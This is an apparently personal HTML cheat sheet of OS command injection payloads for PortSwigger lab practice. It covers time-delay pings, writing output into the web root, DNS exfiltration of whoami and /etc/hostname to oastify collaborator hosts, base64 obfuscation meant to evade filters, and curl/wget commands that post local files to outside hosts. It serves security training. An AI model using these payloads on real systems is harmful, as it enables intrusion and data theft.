<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>Command Injection</title>
  <link rel="stylesheet" href="/static/style.css">

</head>
<body>
<header id="title-block-header">
</header>
<h1 id="command-injection">Command Injection</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><p><a href="#recon">General Recon For Comamnd Injection
Vulnerabilities</a></p></li>
<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
Payloads</a></p>
<ul>
<li><a href="#obfuscation-payloads">Obfuscation Related
Payloads</a></li>
</ul></li>
</ul>
<p><br></p>
<h2 id="resources">Resources</h2>
<ul>
<li>https://portswigger.net/web-security/os-command-injection</li>
<li>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection</li>
</ul>
<p><br></p>
<h2 id="recon">Recon</h2>
<ul>
<li>First step is to perform application mapping and identify any
instances where the application appears to be interacting with the
underlying OS by calling external processes or accessing the
filesystem.<br />
</li>
<li>The application may issue OS system commands containing any item of
user supplied data (every URL, parameters, cookies, etc.). It’s
recommended to probe all these instances for OS Command Injection.</li>
</ul>
<p><br></p>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<h3 id="background-knowledge">Background Knowledge</h3>
<ul>
<li><p>The characters ; | &amp; and newline(URL encoded -&gt; %0a) can
be used to batch multiple commands one after another. Each of these
characters should be used when probing for command injection
vulnerabilities, as the application may reject some inputs but accept
others.</p></li>
<li><p>The backtick ` character can also be used to encapsulate a
separate command within a data item being processed by the original
command. This will cause the interpreter to execute this command first
before continuing to execute the remaining command String:</p></li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nslookup</span> <span class="kw">`</span><span class="fu">whoami</span><span class="kw">`</span>.server-you-control.net</span></code></pre></div>
<p><br></p>
<ul>
<li><p>Other useful commands to know:
https://portswigger.net/web-security/os-command-injection#useful-commands</p></li>
<li><p>Ways of injecting OS commands:
https://portswigger.net/web-security/os-command-injection#ways-of-injecting-os-commands</p></li>
</ul>
<p>Note: Note that the different shell metacharacters have subtly
different behaviors that might affect whether they work in certain
situations, and whether they allow in-band retrieval of command output
or are useful only for blind exploitation.</p>
<p>Sometimes, the input that you control appears within quotation marks
in the original command. In this situation, you need to terminate the
quoted context (using ” or ’) before using suitable shell metacharacters
to inject a new command.</p>
<p><br></p>
<h3 id="example">Example</h3>
<ul>
<li><p>Many times the injected characters need to be encoded, since they
can interfere with the structure of the URL/body parameters.</p>
<ul>
<li>For example, below the &amp; and {space} characters need to be URL
encoded (%26 and %20) in order to be treated as part of the injection
payload:</li>
</ul></li>
</ul>
<figure>
<img
src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/Command%20Injection/Images/CommandInjection-1.png"
alt="Command Injection" />
<figcaption aria-hidden="true">Command Injection</figcaption>
</figure>
<p><br></p>
<h3 id="simple-command-injection">Simple Command Injection</h3>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="bu">echo</span> test123 <span class="kw">&amp;</span></span></code></pre></div>
<p><br></p>
<h3 id="blind-command-injection">Blind Command Injection</h3>
<ul>
<li><p>Many times, the results of the injected commands are not returned
in the application responses. If that is the case, we can use the ping
command to trigger a time delay in the application’s response by causing
the server to ping its loopback interface for a specific time
period.</p></li>
<li><p>To maximize chances of identifying OS Command Injection if the
application is filtering certain command separators, submit each of the
following payloads to each input fields and analyze the time taken for
the application to respond:</p></li>
</ul>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">ping</span> <span class="at">-i</span> 30 127.0.0.1 <span class="kw">|</span></span></code></pre></div>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="fu">ping</span> <span class="at">-n</span> 30 127.0.0.1 <span class="kw">|</span></span></code></pre></div>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="fu">ping</span> <span class="at">-i</span> 30 127.0.0.1 <span class="kw">&amp;</span></span></code></pre></div>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="fu">ping</span> <span class="at">-n</span> 30 127.0.0.1 <span class="kw">&amp;</span></span></code></pre></div>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span> <span class="fu">ping</span> <span class="at">-i</span> 30 127.0.0.1 <span class="kw">;</span></span></code></pre></div>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">%0a</span> ping <span class="at">-i</span> 30 127.0.0.1 %0a</span></code></pre></div>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">`</span> <span class="fu">ping</span> 127.0.0.1 <span class="kw">`</span></span></code></pre></div>
<p><br></p>
<h3 id="output-redirection">Output Redirection</h3>
<ul>
<li>We can also redirect a commands output to a file using the &gt;
character. The below example redirects the output of the OS command to a
file <u>within the web root</u>, then we can access the file to view the
contents through our browser.</li>
</ul>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span> <span class="fu">whoami</span> <span class="op">&gt;</span> /var/www/images/test<span class="kw">;</span></span></code></pre></div>
<p><br></p>
<h3 id="out-of-band-channel-payloads">Out-of-band channel payloads</h3>
<h4 id="network-interaction">Network Interaction</h4>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span> <span class="ex">nslookup</span> server-you-control <span class="kw">;</span></span></code></pre></div>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;</span> <span class="ex">nslookup</span> server-you-control <span class="kw">&amp;</span></span></code></pre></div>
<p><br></p>
<h4 id="reverse-shells">Reverse Shells</h4>
<ul>
<li>https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
</ul>
<p><br></p>
<h4 id="dns-data-exfiltration">DNS Data Exfiltration</h4>
<ul>
<li>Using backticks `<em>command</em>` and $(<em>command</em>)</li>
</ul>
<div class="sourceCode" id="cb13"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span> <span class="ex">nslookup</span> <span class="va">$(</span><span class="fu">whoami</span><span class="va">)</span>.server-you-control <span class="kw">;</span></span></code></pre></div>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">;</span> <span class="ex">nslookup</span> <span class="kw">`</span><span class="fu">whoami</span><span class="kw">`</span>.server-you-control <span class="kw">;</span></span></code></pre></div>
<p><br><br><br></p>
<h3 id="obfuscation-payloads">Obfuscation Payloads:</h3>
<p>The goal here was to learn how the following payload can be
obfuscated, to bypass filters for data exfiltration.</p>
<p>The payloads can be combined when exploiting Template Injection or
other vulnerabilities that use OS Command injection.</p>
<p><br></p>
<ul>
<li>Original Payload:</li>
</ul>
<pre><code>||nslookup+$(cat+/etc/hostname).fp8v70vp.oastify.com||</code></pre>
<p><br></p>
<ul>
<li>Obfuscation - Using the “echo” command to help obfuscate the word
“hostname”</li>
</ul>
<pre><code>||nslookup+$(cat+/etc/ho`echo+&#39;stname&#39;`).fp8w54v70vp.oastify.com||</code></pre>
<p><br></p>
<ul>
<li>Obfuscation - Using base64 encoding to “hide” the file name
“/etc/hostname”</li>
</ul>
<pre><code>||nslookup+$(cat+`echo+&#39;L2V0Yy9ob3N0bmFtZQ==&#39;+|+base64+--decode`).fp8v70vp.oastify.com||</code></pre>
<ul>
<li>Decoded payload</li>
</ul>
<pre><code>||nslookup $(cat `echo &#39;L2V0Yy9ob3N0bmFtZQ==&#39; | base64 --decode`).fp8w70vp.oastify.com||</code></pre>
<p><br></p>
<ul>
<li>Obfuscation - Using base encoding to “hide” the whole command “cat
/etc/hostname”</li>
</ul>
<pre><code>||nslookup+$(`echo+&#39;Y2F0IC9ldGMvaG9zdG5hbWU=&#39;+|+base64+--decode`).er9v70tk9lz9o.oastify.com||</code></pre>
<p><br><br></p>
<ul>
<li>Other methods to achieve data exfiltration:</li>
</ul>
<pre><code>nslookup -q=cname $(cat /home/test).burp.oastify.com</code></pre>
<pre><code>wget http://burp-collab.com --post-file=/home/test</code></pre>
<pre><code>curl http://wcq0jo8.oastify.com -d @/home/test</code></pre>
<p><br><br><br></p>
<h3
id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
to complete labs that are missing from cheat sheet:</h3>
<ul>
<li>All labs in this category are completed and referenced in cheat
sheet.</li>
</ul>
</body>
</html>
